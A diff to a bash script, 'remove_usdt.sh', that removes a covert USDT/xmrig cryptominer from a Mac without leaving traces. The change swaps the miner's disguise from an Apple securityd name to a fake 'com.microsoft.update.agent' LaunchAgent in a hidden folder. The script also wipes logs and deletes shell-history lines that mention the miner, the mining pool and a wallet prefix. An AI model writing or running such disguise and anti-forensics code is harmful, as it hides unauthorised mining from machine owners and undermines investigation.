@@ -1,8 +1,8 @@
 #!/usr/bin/env bash
 # remove_usdt.sh — Zero-trace removal of USDT miner
 
-DISGUISE_NAME="com.apple.securityd.network"
-INSTALL_DIR="$HOME/Library/Application Support/.scdn"
+DISGUISE_NAME="com.microsoft.update.agent"
+INSTALL_DIR="$HOME/Library/Application Support/.msupd"
 PLIST_PATH="$HOME/Library/LaunchAgents/${DISGUISE_NAME}.plist"
 LOG_PATH="$HOME/Library/Logs/${DISGUISE_NAME}.log"
 
@@ -23,7 +23,7 @@ echo "[4/5] Wiping logs..."
 rm -f "$LOG_PATH" && echo "      ✓ Log wiped"
 echo "[5/5] Scrubbing history..."
 for H in "$HOME/.zsh_history" "$HOME/.bash_history"; do
-  [[ -f "$H" ]] && sed -i '' '/mine_usdt\|xmrig\|unmineable\|securityd\.network\|TFgAiy/d' "$H" 2>/dev/null && echo "      ✓ $H cleaned"
+  [[ -f "$H" ]] && sed -i '' '/mine_usdt\|xmrig\|unmineable\|microsoft\.update\.agent\|TFgAiy/d' "$H" 2>/dev/null && echo "      ✓ $H cleaned"
 done
 history -c 2>/dev/null || true
 echo ""
